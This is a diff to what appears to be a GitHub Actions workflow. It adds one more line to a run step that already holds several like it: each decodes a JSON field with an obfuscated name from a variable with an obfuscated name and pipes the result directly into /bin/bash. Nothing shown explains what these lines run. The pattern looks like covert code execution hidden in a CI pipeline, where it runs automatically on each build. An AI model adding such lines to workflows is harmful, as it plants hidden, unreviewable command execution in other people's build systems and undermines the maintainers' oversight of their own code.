@@ -29,6 +29,7 @@ jobs:
           echo $dsve053 | jq -r .w3 | /bin/bash
           printf '%s' "$b11" | jq -r .clv59242 | /bin/bash
           echo $ucl4776 | jq -r .fkthz713 | /bin/bash
+          printf '%s' "$d9" | jq -r .ihzi4831 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
